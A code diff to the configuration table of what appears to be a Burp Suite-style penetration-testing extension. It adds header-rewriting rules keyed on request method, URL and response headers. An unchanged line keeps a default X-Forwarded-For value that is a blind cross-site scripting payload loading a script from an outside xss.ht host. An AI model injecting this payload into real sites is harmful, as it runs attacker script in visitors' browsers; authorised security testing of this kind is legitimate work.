@@ -79,6 +79,11 @@ public class ConfigTableModel extends AbstractTableModel{
 		configEntries.add(new ConfigEntry("Chunked-AutoEnable", "",ConfigEntry.Config_Chunked_Variable,false,false));
 		configEntries.add(new ConfigEntry("Chunked-UseComment", "",ConfigEntry.Config_Chunked_Variable,true,false));
 
+		//自动化处理一些常用的属性
+		configEntries.add(new ConfigEntry("AddRespHeaderByReqMethod", "{\"OPTIONS\":\"Content-Type: application/octet-stream\"}",ConfigEntry.Config_Basic_Variable,true,false,"修改响应：方法名 基于请求方法添加响应头"));
+		configEntries.add(new ConfigEntry("AddRespHeaderByReqURL", "{\"picture\":\"Content-Type: application/octet-stream\"}",ConfigEntry.Config_Basic_Variable,false,false,"修改响应：关键字|正则 基于请求URL添加响应头"));
+		configEntries.add(new ConfigEntry("AddRespHeaderByRespHeader", "{\"application/json\":\"Content-Type: text/html;charset=utf-8\"}",ConfigEntry.Config_Basic_Variable,false,false,"修改响应：关键字|正则 基于响应头添加响应头"));
+
 		//configEntries.add(new ConfigEntry("Proxy-ServerList", "127.0.0.1:8888;127.0.0.1:9999;",ConfigEntry.Config_Proxy_Variable,false,false));
 		//configEntries.add(new ConfigEntry("Proxy-UseRandomMode", "",ConfigEntry.Config_Proxy_Variable,true,false));
 		//以上都是固定基础变量，不需要修改名称和类型
@@ -86,7 +91,7 @@ public class ConfigTableModel extends AbstractTableModel{
 		configEntries.add(new ConfigEntry("Last-Modified", "",ConfigEntry.Action_Remove_From_Headers,false,false));
 		configEntries.add(new ConfigEntry("If-Modified-Since", "",ConfigEntry.Action_Remove_From_Headers,false,false));
 		configEntries.add(new ConfigEntry("If-None-Match", "",ConfigEntry.Action_Remove_From_Headers,false,false));
-		configEntries.add(new ConfigEntry("OPTIONS", "",ConfigEntry.Action_Forward_And_Hide_Options,true,false));
+		//configEntries.add(new ConfigEntry("OPTIONS", "",ConfigEntry.Action_Forward_And_Hide_Options,false,false)); //无效 使用旧方案替代
 
 		configEntries.add(new ConfigEntry("X-Forwarded-For", "'\\\"><sCRiPt/src=//bmw.xss.ht>",ConfigEntry.Action_Add_Or_Replace_Header,false,false));
 		//避免IP:port的切分操作，把Payload破坏，所以使用不带分号的简洁Payload
